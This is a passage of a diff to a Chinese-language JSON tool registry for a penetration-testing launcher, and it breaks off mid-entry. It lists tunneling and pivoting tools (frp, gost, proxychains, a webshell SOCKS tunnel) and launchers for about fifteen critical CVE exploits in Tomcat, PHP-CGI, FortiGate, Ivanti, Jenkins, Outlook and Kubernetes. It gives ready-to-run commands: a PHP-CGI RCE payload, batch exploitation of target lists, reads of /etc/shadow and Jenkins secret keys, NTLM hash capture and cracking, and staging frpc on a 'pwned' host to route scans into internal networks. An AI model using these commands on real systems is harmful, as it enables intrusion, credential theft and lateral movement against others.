+    "description": "多协议隧道代理 (v3.3.0) — 实测可用\n  ~/go/bin/gost\n常用:\n  gost -L :1080                         本地SOCKS5\n  gost -L :8080 -F socks5://user:pass@server:1080\n  gost -L tcp://:2222/192.168.1.1:22    TCP端口转发\n  gost -L socks5://:1080 -F 'http://proxy:8080'\n  gost -L relay+tls://:8443 -F socks5://127.0.0.1:1080",
+    "available": true
+  },
+  {
+    "id": "frpc",
+    "name": "frpc (内网穿透客户端)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/frpc",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "frp",
+      "frpc",
+      "tunnel",
+      "intranet",
+      "proxy"
+    ],
+    "description": "frpc v0.68.1 — FRP 内网穿透客户端（实测可用）\n路径: /opt/homebrew/bin/frpc\n\n━━━ 场景一：TCP端口映射（最常用）━━━\n把目标内网机器的端口映射到VPS公网端口\n\n命令行模式（无需配置文件）:\n```\nfrpc tcp -s VPS_IP -P 7000 -t your_token   -l 3389 -r 13389 -n rdp_session\n```\n  -s VPS IP    -P frps端口(默认7000)   -t token\n  -l 本地端口  -r VPS上暴露的端口      -n 会话名\n\nSSH内网机映射:\n```\nfrpc tcp -s VPS_IP -P 7000 -t your_token -l 22 -r 10022 -n ssh_target\n# 然后本机: ssh user@VPS_IP -p 10022\n```\n\nMeterpreter反连（内网→VPS）:\n```\n# msf监听在VPS:4444，目标机运行frpc把本机4444映射出去\n# 更常见: 直接让目标连VPS，frpc做正向隧道\nfrpc tcp -s VPS_IP -P 7000 -t token -l 4444 -r 14444 -n msf\n```\n\n━━━ 场景二：SOCKS5代理穿透（proxychains打内网）━━━\nfrps端创建socks5隧道，本机通过proxychains访问整个内网\n\nfrpc端（目标内网机上运行）配置文件 frpc.toml:\n```\nserverAddr = \"VPS_IP\"\nserverPort = 7000\nauth.method = \"token\"\nauth.token = \"your_token\"\n\n[[proxies]]\nname = \"socks5_tunnel\"\ntype = \"socks5\"\nremotePort = 1080\n```\n启动:\n```\nfrpc -c frpc.toml\n```\n本机 proxychains.conf:\n```\nsocks5 VPS_IP 1080\n```\n使用:\n```\nproxychains4 nmap -sT -Pn 10.0.0.1\nproxychains4 curl http://192.168.1.100\n```\n\n━━━ 场景三：HTTP内网服务穿透（Web后台）━━━\n把内网web服务映射到VPS域名（需frps开subdomain_host）\n\n```\nfrpc http -s VPS_IP -P 7000 -t token   -l 8080 --sd admin -n web_admin\n# 访问: http://admin.VPS域名\n```\n\n━━━ 场景四：完整配置文件模式 frpc.toml ━━━\n```\nserverAddr = \"VPS_IP\"\nserverPort = 7000\nauth.method = \"token\"\nauth.token = \"your_token\"\n\n# 同时开多个隧道\n[[proxies]]\nname = \"rdp\"\ntype = \"tcp\"\nlocalIP = \"127.0.0.1\"\nlocalPort = 3389\nremotePort = 13389\n\n[[proxies]]\nname = \"ssh\"\ntype = \"tcp\"\nlocalIP = \"127.0.0.1\"\nlocalPort = 22\nremotePort = 10022\n\n[[proxies]]\nname = \"socks5\"\ntype = \"socks5\"\nremotePort = 1080\n```\n启动/热更新:\n```\nfrpc -c frpc.toml           # 启动\nfrpc reload -c frpc.toml    # 热更新(不断连)\nfrpc status -c frpc.toml    # 查看各隧道状态\nfrpc stop -c frpc.toml      # 停止\n```\n\n━━━ 静态二进制上传到目标机 ━━━\n渗透中目标机没有frpc时，上传静态编译版:\n```\n# 本机上传\nscp ~/.local/bin/frpc_linux_amd64 user@target:/tmp/frpc\n# 目标机执行\nchmod +x /tmp/frpc\n/tmp/frpc tcp -s VPS_IP -P 7000 -t token -l 22 -r 10022 -n pwned\n```\n静态包下载: https://github.com/fatedier/frp/releases",
+    "available": true
+  },
+  {
+    "id": "frps",
+    "name": "frps (内网穿透服务端)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/frps",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "frp",
+      "frps",
+      "server",
+      "tunnel"
+    ],
+    "description": "frps v0.68.1 — FRP 服务端（部署在VPS）\n路径: /opt/homebrew/bin/frps\n\n━━━ 基础部署（VPS上运行）━━━\n\n最简配置 /etc/frp/frps.toml:\n```\nbindPort = 7000\nauth.method = \"token\"\nauth.token = \"your_strong_token_here\"\n```\n启动:\n```\nfrps -c /etc/frp/frps.toml\n```\n\n━━━ 完整推荐配置 frps.toml ━━━\n```\nbindAddr = \"0.0.0.0\"\nbindPort = 7000\n\n# 允许客户端使用的端口范围（防止乱占）\nallowPorts = [\n  { start = 10000, end = 20000 }\n]\n\n# Web Dashboard（可选，用于监控连接）\nwebServer.addr = \"0.0.0.0\"\nwebServer.port = 7500\nwebServer.user = \"admin\"\nwebServer.password = \"admin123\"\n\n# Token认证\nauth.method = \"token\"\nauth.token = \"your_strong_token_here\"\n\n# 日志\nlog.to = \"/var/log/frps.log\"\nlog.level = \"info\"\nlog.maxDays = 7\n```\n启动后访问 Dashboard: http://VPS_IP:7500\n\n━━━ systemd 后台持久化（Ubuntu/CentOS）━━━\n```\n# /etc/systemd/system/frps.service\n[Unit]\nDescription=FRP Server\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/frps -c /etc/frp/frps.toml\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\n```\n```\nsystemctl enable frps\nsystemctl start frps\nsystemctl status frps\n```\n\n━━━ 本机测试（不需要VPS）━━━\n```\n# 终端1: 启动frps（本地监听）\nfrps -p 7000\n\n# 终端2: 启动frpc连本机\nfrpc tcp -s 127.0.0.1 -P 7000 -l 22 -r 10022 -n test\n\n# 验证: 本机22端口被映射到10022\nssh user@127.0.0.1 -p 10022\n```\n\n━━━ 防火墙注意 ━━━\nVPS需开放端口:\n```\n# frps监听端口（客户端连接）\nufw allow 7000/tcp\n# 映射给攻击者用的端口范围\nufw allow 10000:20000/tcp\n# Dashboard（可选，建议只绑内网）\nufw allow 7500/tcp\n```\n\n━━━ 配合proxychains全流程（完整渗透场景）━━━\n```\n# 1. VPS上启动frps（已持久化）\n# 2. 目标内网机上传frpc静态包并执行:\n./frpc socks5 -s VPS_IP -P 7000 -t token -r 1080 -n pivot\n# 3. 本机 /etc/proxychains4.conf 末尾加:\n#    socks5 VPS_IP 1080\n# 4. 开打:\nproxychains4 nmap -sT -Pn -p 22,80,443,3389 10.0.0.0/24\nproxychains4 evil-winrm -i 10.0.0.5 -u admin -p password\n```\n\n下载最新版: https://github.com/fatedier/frp/releases",
+    "available": true
+  },
+  {
+    "id": "proxychains4",
+    "name": "proxychains4 (代理命令)",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/proxychains4",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "proxychains",
+      "proxy",
+      "socks5",
+      "force-proxy"
+    ],
+    "description": "代理链工具 — 实测可用\n  /opt/homebrew/bin/proxychains4\n常用:\n  proxychains4 nmap -sT -Pn 10.10.10.0/24\n  proxychains4 sqlmap -u http://intranet/?id=1\n  proxychains4 curl http://internal-host/\n  proxychains4 ssh user@192.168.1.10\n配置文件: /opt/homebrew/etc/proxychains.conf\n  socks5 127.0.0.1 1080   # 末尾加这行",
+    "available": true
+  },
+  {
+    "id": "neo-regeorg-http",
+    "name": "Neo-reGeorg (HTTP隧道)",
+    "type": "python",
+    "path": "~/Workspace/security/tools/tunnel/neo-regeorg/neoreg.py",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "regeorg",
+      "http-tunnel",
+      "webshell",
+      "socks5"
+    ],
+    "description": "Neo-reGeorg HTTP隧道，通过WebShell建立SOCKS5代理\n用法:\n  1. 生成隧道脚本(上传到Web服务器):\n     python3 neoreg.py generate -k 密码 -o tunnel.php\n     支持: php/jsp/aspx/jspx 多种格式\n  2. 访问验证: curl http://target/tunnel.php\n  3. 启动本地SOCKS5:\n     python3 neoreg.py -k 密码 -u http://target/tunnel.php\n     本地监听: 127.0.0.1:1080\n  4. Mac配置代理走SOCKS5访问内网\n场景: 只有HTTP/HTTPS通道时的内网穿透方案",
+    "available": true
+  },
+  {
+    "id": "impacket-jump",
+    "name": "impacket-jump (域渗透套件)",
+    "type": "gui",
+    "path": "~/Workspace/security/tools/c2/impacket-jump",
+    "category": "lateral",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "impacket",
+      "domain",
+      "lateral",
+      "ad"
+    ],
+    "description": "impacket-jump域渗透辅助脚本集\n配合Impacket工具集使用，快速执行常见域内横向操作\n路径: ~/Workspace/security/tools/c2/impacket-jump/\n常用场景: PTH横向/Kerberoasting/DCSync/NTLM中继",
+    "available": true
+  },
+  {
+    "id": "cve-2024-2025-exp",
+    "name": "CVE 2024-2025 高危EXP集",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/cve-2024-2025-launcher.sh",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "cve",
+      "rce",
+      "exploit",
+      "2024",
+      "2025",
+      "poc"
+    ],
+    "description": "2024-2025年高危CVE EXP集合快速启动器，含11个RCE/提权漏洞\n包含:\n  CVE-2025-29927  Next.js 中间件鉴权绕过 (CVSS 9.1)\n  CVE-2025-24813  Apache Tomcat Partial PUT RCE (CVSS 9.8)\n  CVE-2024-4577   PHP-CGI 参数注入 RCE Windows (CVSS 9.8)\n  CVE-2024-1086   Linux内核 nf_tables 提权 LPE (成功率99.4%)\n  CVE-2024-53677  Struts2 S2-067 文件上传 RCE (CVSS 9.5)\n  CVE-2024-55591  FortiGate 未认证管理员接管 (CVSS 9.6)\n  CVE-2024-23897  Jenkins 任意文件读取→RCE (CVSS 9.8)\n  CVE-2025-22457  Ivanti Connect Secure RCE (CVSS 9.0)\n  CVE-2025-1974   K8s IngressNightmare RCE (CVSS 9.8)\n  CVE-2024-21413  Outlook NTLM 泄露+RCE (CVSS 9.8)\n  CVE-2025-30065  Apache Parquet Java RCE (CVSS 10.0)\nPOC目录: ~/Workspace/security/poc/2024-2025-cve/",
+    "available": true
+  },
+  {
+    "id": "cve-2025-29927-next-js",
+    "name": "CVE-2025-29927 (Next.js绕过)",
+    "type": "shell",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-29927-nextjs/poc.sh",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "nextjs",
+      "middleware",
+      "auth-bypass",
+      "2025"
+    ],
+    "description": "CVE-2025-29927 — Next.js 认证中间件绕过\n\n影响版本: Next.js < 15.2.3, < 14.2.25, < 13.5.9, < 12.3.5\nCVSS: 9.1 | 通过伪造 x-middleware-subrequest 头绕过中间件认证\n\n检测是否存在漏洞:\n```\ncurl -v 'http://target/admin' \\\n  -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'\n```\n\n批量检测:\n```\nnuclei -u target -t http/cves/2025/CVE-2025-29927.yaml\n# 或手动批量:\nhttpx -l urls.txt -mc 200,301,302 -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'\n```\n\n影响: 可绕过/admin、/dashboard等受中间件保护的路由直接访问\n修复: 升级 Next.js 到 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5+",
+    "available": true
+  },
+  {
+    "id": "cve-2025-24813-tomcat-rce",
+    "name": "CVE-2025-24813 (Tomcat RCE)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-24813-tomcat/CVE_2025_24813.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "tomcat",
+      "rce",
+      "deserialization",
+      "partial-put",
+      "2025"
+    ],
+    "description": "CVE-2025-24813 Apache Tomcat Partial PUT 反序列化 RCE (CVSS 9.8)\n影响: Tomcat 9.0.0~9.0.98 / 10.1.0~10.1.34 / 11.0.0~11.0.2\n条件: defaultServlet 开启 readonly=false (部分宝塔/WDCP默认开启)\n利用流程:\n  1. PUT上传恶意序列化session文件 (Partial PUT)\n  2. 通过JESSIONID触发反序列化\n  3. 获得目标系统命令执行\npython3 CVE_2025_24813.py -u http://target:8080 --cmd whoami",
+    "available": true
+  },
+  {
+    "id": "cve-2024-4577-php-cgi-rce",
+    "name": "CVE-2024-4577 (PHP-CGI RCE)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-4577-php-cgi-v2/CVE-2024-4577.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "php",
+      "cgi",
+      "rce",
+      "windows",
+      "2024"
+    ],
+    "description": "CVE-2024-4577 PHP-CGI参数注入RCE (CVSS 9.8，Windows目标)\n影响: PHP 8.1<8.1.29 / 8.2<8.2.20 / 8.3<8.3.8 (仅Windows+Apache+PHP-CGI)\n利用: 利用Windows字符映射绕过参数过滤，注入php.ini选项\n快速验证:\n  curl \"http://TARGET/php-cgi/php.cgi?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input\" -d \"<?php system('whoami');?>\"\n批量扫描:\n  python3 CVE-2024-4577.py targets.txt\n  python3 watchTowr-vs-php_cve-2024-4577.py (watchTowr原版单目标)\n  bash CVE-2024-4577.sh (Bash版)",
+    "available": true
+  },
+  {
+    "id": "cve-2024-1086-linux-lpe",
+    "name": "CVE-2024-1086 (Linux内核LPE)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-1086-linux-lpe",
+    "category": "privesc-linux",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "linux",
+      "kernel",
+      "lpe",
+      "nftables",
+      "uaf",
+      "2024"
+    ],
+    "description": "CVE-2024-1086 Linux内核nf_tables UAF本地提权 (CVSS 7.8)\n影响: Linux kernel v5.14~v6.6 (Debian/Ubuntu/大量发行版)\n原理: netfilter nf_tables组件use-after-free，成功率99.4%\n条件: 低权限用户+非特权user namespace (Ubuntu默认开启)\n使用方法 (在目标Linux机器上):\n  make && ./exploit\n  # 成功后获得root shell\n注意: 需要在目标机器上编译，源码在本地POC目录供参考\n目录: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-1086-linux-lpe/\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "cve-2024-53677-s2-067-struts2-rce",
+    "name": "CVE-2024-53677 S2-067 (Struts2 RCE)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-53677-struts2/S2-067.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "struts2",
+      "rce",
+      "file-upload",
+      "webshell",
+      "2024"
+    ],
+    "description": "CVE-2024-53677 Struts2 S2-067文件上传RCE (CVSS 9.5)\n影响: Struts 2.0.0~6.3.0.2 (修复版: 6.4.0+)\n原理: 文件上传拦截器路径穿越，可上传WebShell到任意目录\n用法:\n  python3 S2-067.py -u http://target/upload --upload_endpoint /upload --files shell.jsp --destination /webapps/ROOT/\n  python3 Check-CVE-2024-53677.py -u http://target  (仅检测)\n  python3 CVE-2024-53677.py (EQSTLab版，含利用)",
+    "available": true
+  },
+  {
+    "id": "cve-2024-55591-fortigate",
+    "name": "CVE-2024-55591 (FortiGate接管)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-55591-fortios/CVE-2024-55591-PoC.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "fortinet",
+      "fortigate",
+      "auth-bypass",
+      "admin",
+      "2024"
+    ],
+    "description": "CVE-2024-55591 FortiGate/FortiOS未认证super-admin接管 (CVSS 9.6)\n影响: FortiOS 7.0.0~7.0.16 / FortiProxy 7.0.0~7.2.12\n原理: Node.js websocket模块路径问题，伪造管理会话获得super-admin\n2024年11月起已被在野利用\n用法:\n  python3 CVE-2024-55591-PoC.py -t https://fortigate-ip\n  # 成功后获得管理员凭据或直接接管设备",
+    "available": true
+  },
+  {
+    "id": "cve-2024-23897-jenkins",
+    "name": "CVE-2024-23897 (Jenkins文件读取)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-23897-jenkins/CVE-2024-23897 Jenkins.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "jenkins",
+      "file-read",
+      "rce",
+      "lfi",
+      "2024"
+    ],
+    "description": "CVE-2024-23897 Jenkins任意文件读取→RCE (CVSS 9.8)\n影响: Jenkins <= 2.441 / LTS <= 2.426.2\n原理: CLI命令解析器将@filename替换为文件内容，未认证读取任意文件\n利用链: 读取/etc/passwd → 读取secrets.key → 解密凭据 → 接管Jenkins\n用法:\n  python3 'CVE-2024-23897 Jenkins.py' -u http://jenkins:8080 -f /etc/passwd\n  python3 'CVE-2024-23897 Jenkins.py' -u http://jenkins:8080 -f /var/jenkins_home/secrets/master.key\n  python3 'CVE-2024-23897 Jenkins.py' -l jenkins_list.txt -f /etc/shadow",
+    "available": true
+  },
+  {
+    "id": "cve-2025-22457-ivanti-rce",
+    "name": "CVE-2025-22457 (Ivanti RCE)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-22457-ivanti-v2/CVE-2025-22457.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "ivanti",
+      "vpn",
+      "rce",
+      "stackover",
+      "apt",
+      "2025"
+    ],
+    "description": "CVE-2025-22457 Ivanti Connect Secure未认证RCE (CVSS 9.0)\n影响: Ivanti Connect Secure / Pulse Secure / Policy Secure / ZTA Gateway\n原理: X-Forwarded-For头未校验长度，栈溢出触发RCE\n被中国APT组织UNC5221 (BRICKSTORM/SPAWNCHIMERA家族) 在野利用\n用法:\n  python3 CVE-2025-22457.py --target https://ivanti-ip  (单目标)\n  python3 CVE-2025-22457.py --input targets.txt          (批量)\n  python3 CVE-2025-22457.py --target https://ivanti-ip --mode detailed\n  rb版: MSF模块 exploit/linux/http/ivanti_connect_secure_rce",
+    "available": true
+  },
+  {
+    "id": "cve-2025-1974-k8s-ingressnightmare",
+    "name": "CVE-2025-1974 (K8s IngressNightmare)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-1974-ingress-nginx/poc.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "kubernetes",
+      "k8s",
+      "ingress-nginx",
+      "rce",
+      "container",
+      "2025"
+    ],
+    "description": "CVE-2025-1974 K8s IngressNightmare未认证RCE (CVSS 9.8)\n影响: ingress-nginx < 1.11.5 / < 1.12.1 (约43%云环境受影响)\n原理: admission controller配置注入→加载恶意共享库→RCE\n权限: controller默认有全集群Secret读权限，可接管整个K8s集群\n条件: 需要能访问ingress controller的Pod网络\n用法:\n  python3 poc.py http://ingress-controller:80 https://admission-webhook:443 攻击机IP:4444\n  调试: bash debug.sh",
+    "available": true
+  },
+  {
+    "id": "cve-2024-21413-outlook-ntlm",
+    "name": "CVE-2024-21413 (Outlook NTLM)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-21413-outlook/CVE-2024-21413.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "outlook",
+      "ntlm",
+      "hash",
+      "windows",
+      "email",
+      "2024"
+    ],
+    "description": "CVE-2024-21413 Outlook #MonikerLink NTLM哈希泄露 (CVSS 9.8)\n影响: Microsoft Outlook全平台 (2024年2月补丁前)\n原理: 特制file://链接绕过Protected View，预览窗格即触发NTLM认证\n利用流程:\n  1. python3 CVE-2024-21413.py 生成恶意邮件\n  2. Responder/ntlmrelayx监听捕获NTLMv2哈希\n  3. hashcat -m 5600 hash.txt rockyou.txt 离线破解\n  4. 或ntlmrelayx中继到其他服务\n配合域渗透场景使用(钓鱼/内网横向)",
+    "available": true
+  },
+  {
+    "id": "cve-2025-30065-parquet-rce-cvss10",
+    "name": "CVE-2025-30065 (Parquet RCE CVSS10)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-30065-parquet",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "parquet",
+      "java",
+      "deserialization",
+      "rce",
+      "supply-chain",
+      "2025"
+    ],
+    "description": "CVE-2025-30065 Apache Parquet Java反序列化RCE (CVSS 10.0满分)\n影响: Apache Parquet Java <= 1.15.0\n原理: parquet-avro解析Avro schema时不安全反序列化，读取恶意文件即RCE\n场景: 大数据管道/ETL/数据分析平台，传入恶意Parquet文件触发\n用法 (Java编译):\n  cd poc目录\n  javac PayloadRecord.java ParquetVictim.java POC-CVE-2025-30065-ParquetExploitGenerator.java\n  java POC-CVE-2025-30065-ParquetExploitGenerator  (生成恶意parquet文件)\n  # 将生成的文件传给目标Parquet处理程序即触发\n目录: ~/Workspace/security/poc/2024-2025-cve/CVE-2025-30065-parquet/\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "awesome-poc",
+    "name": "Awesome-POC (漏洞知识库)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/collections/Awesome-POC",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "poc",
+      "oa",
+      "middleware",
+      "collection",
+      "chinese"
+    ],
+    "description": "Threekiii/Awesome-POC 中文漏洞POC知识库，含OA/中间件/网络设备/框架\n覆盖: 致远/泛微/用友/蓝凌/金蝶/禅道/帆软等国内OA系统\n     Apache/Struts2/Shiro/Solr/Flink/Tomcat/Weblogic等中间件\n     Cisco/Fortinet/F5/Sangfor等网络设备\n用法: \n  open ~/Workspace/security/poc/collections/Awesome-POC    (Finder)\n  ls ~/Workspace/security/poc/collections/Awesome-POC/     (目录)\n配套: Vulnerability-Wiki在线版 https://threekiii.github.io/Vulnerability-Wiki/\n规模: 1000+漏洞，含复现环境搭建说明和Payload",
+    "available": true
+  },
+  {
+    "id": "poc-2025-2025",
+    "name": "POC-2025 (2025年漏洞集)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/collections/POC-2025",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "poc",
+      "2025",
+      "oa",
+      "collection"
+    ],
+    "description": "LNEYYY/POC-2025 持续更新的2025年漏洞EXP/POC集合\n规模: 1400+ POC/EXP (505个目录)\n覆盖OA系统: 泛微/致远/用友/蓝凌/通达/万户/金和/宏景/协达/联达等30+国内OA\n其他: Apache/Spring/Weblogic/Nacos/Jenkins等框架\n特点: 每条漏洞含利用步骤说明，2025年持续更新\n路径: ~/Workspace/security/poc/collections/POC-2025/\n  ls POC-2025/致远OA/ → 含反序列化RCE/文件上传/未授权等分类",
+    "available": true
+  },
+  {
+    "id": "mdpocs-hvv-exp",
+    "name": "MDPOCS (HVV专项EXP)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/collections/MDPOCS",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "poc",
+      "hvv",
+      "oa",
+      "rce",
+      "python"
+    ],
+    "description": "MD-SEC/MDPOCS HVV专项Python EXP集合，直接可执行\n覆盖: 泛微/蓝凌/金蝶/海康威视/大华/绿盟/奇安信等国内厂商\n特点: 全部Python脚本，含检测和利用两个版本(_Poc.py/_Exp.py)\n主要漏洞类型: RCE/文件上传/SQL注入/文件读取/未授权\n用法示例:\n  python3 Weaver_Oa_Eoffice_Uploadify_Upload_File_Poc.py -u http://target\n  python3 Landray_Oa_Treexml_Rce_Poc.py -u http://target\n  python3 Kingdee_Erp_Unserialize_Rce_Poc.py -u http://target\n路径: ~/Workspace/security/poc/collections/MDPOCS/\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "hac-hvv-exp",
+    "name": "HAC HVV EXP集",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/collections/HAC_HVV_EXP",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "hvv",
+      "rce",
+      "oa",
+      "fileupload",
+      "collection"
+    ],
+    "description": "MzzdToT/HAC_Bored_Writing HVV弹药库，按漏洞类型分类\n目录结构:\n  RCE/       → 命令执行漏洞EXP (用友NC/金蝶/蓝凌/绿盟等)\n  Fileupload → 文件上传EXP\n  FileRead/  → 文件读取POC\n  Sqlinject/ → SQL注入POC\n  unauthorized/ → 未授权访问检测\n快速使用: ls RCE/ 查看所有RCE利用脚本\n路径: ~/Workspace/security/poc/collections/HAC_HVV_EXP/",
+    "available": true
+  },
+  {
+    "id": "penetration-testing-poc",
+    "name": "Penetration Testing POC大合集",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/collections/Penetration_Testing_POC",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "poc",
+      "pentest",
+      "collection",
+      "oa",
+      "cms"
+    ],
+    "description": "Mr-xn/Penetration_Testing_POC 渗透测试POC/EXP大合集\n覆盖: 国内OA(泛微/致远/通达/万户)/CMS/中间件/提权/WAF绕过\n特点: 含大量现成Python/bash利用脚本，长期维护\n路径: ~/Workspace/security/poc/collections/Penetration_Testing_POC/",
+    "available": true
+  },
+  {
+    "id": "fastjson-notes",
+    "name": "Fastjson-Notes (全版本利用)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/collections/Fastjson-Notes",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "fastjson",
+      "java",
+      "deserialization",
+      "rce"
+    ],
+    "description": "safe6Sec/Fastjson Fastjson全版本漏洞利用姿势整理\n覆盖: Fastjson 1.2.24 / 1.2.47 / 1.2.68 / 1.2.80 全版本\n内容: 各版本绕过方式/利用链/DNSLOG检测/JNDI服务器配置\n1.2.80绕过: 通过C3P0/Shiro JNDI链绕过autoType限制\n版本探测: 1.2.80触发1次DNS，1.2.83触发2次DNS可区分版本\n配合: JNDIExploit-2.0 + marshalsec提供LDAP/RMI服务\n路径: ~/Workspace/security/poc/collections/Fastjson-Notes/",
+    "available": true
+  },
+  {
+    "id": "cve-2024-50379-tomcat-rce",
+    "name": "CVE-2024-50379 (Tomcat竞争RCE)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-50379-tomcat",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "tomcat",
+      "rce",
+      "race-condition",
+      "toctou",
+      "2024"
+    ],
+    "description": "CVE-2024-50379 Apache Tomcat TOCTOU条件竞争RCE (CVSS 9.8)\n影响: Tomcat 11.0.0-M1~11.0.1 / 10.1.0-M1~10.1.33 / 9.0.0.M1~9.0.97\n条件: case-insensitive文件系统(Windows/macOS) + defaultServlet写权限\n原理: 同时PUT上传和编译JSP触发竞争条件，绕过检查执行任意代码\n工具: Go语言实现，并发发包触发竞态\n用法:\n  go run main.go -u http://target:8080/upload\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-50379-tomcat/\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "cve-2024-27198-teamcity-rce",
+    "name": "CVE-2024-27198 (TeamCity RCE)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-27198-teamcity/RCity.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "teamcity",
+      "jetbrains",
+      "auth-bypass",
+      "rce",
+      "2024"
+    ],
+    "description": "CVE-2024-27198 JetBrains TeamCity认证绕过+RCE (CVSS 9.8)\n影响: TeamCity <= 2023.11.3\n原理: /app/rest/debug/processes等REST API端点认证绕过，创建管理员账号后RCE\n用法:\n  python3 RCity.py -u http://teamcity:8111         (检测+利用)\n  python3 RCity.py -u http://teamcity:8111 --cmd whoami  (执行命令)\n  python3 RCity.py -l targets.txt                  (批量)\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-27198-teamcity/",
+    "available": true
+  },
+  {
+    "id": "cve-2024-21762-fortios-ssl-vpn-rce",
+    "name": "CVE-2024-21762 (FortiOS SSL VPN RCE)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-21762-fortios/CVE-2024-21762.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "fortinet",
+      "fortigate",
+      "ssl-vpn",
+      "rce",
+      "oob",
+      "2024"
+    ],
+    "description": "CVE-2024-21762 Fortinet FortiOS SSL VPN越界写RCE (CVSS 9.6)\n影响: FortiOS 6.0/6.2/6.4/7.0/7.2/7.4多版本 (<7.4.3)\n原理: SSL VPN daemon越界写，未认证远程攻击者可执行任意代码\n已被APT组织在野利用\n用法:\n  python3 CVE-2024-21762.py -u https://fortigate-ip  (检测)\n  python3 CVE-2024-21762.py -u https://fortigate-ip --exploit  (利用)\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-21762-fortios/",
+    "available": true
+  },
+  {
+    "id": "cve-2024-47575-fortijump-fortimanager-rc",
+    "name": "CVE-2024-47575 FortiJump (FortiManager RCE)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-47575-fortijump/CVE-2024-47575.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "fortinet",
+      "fortimanager",
+      "rce",
+      "unauthenticated",
+      "apt",
+      "2024"
+    ],
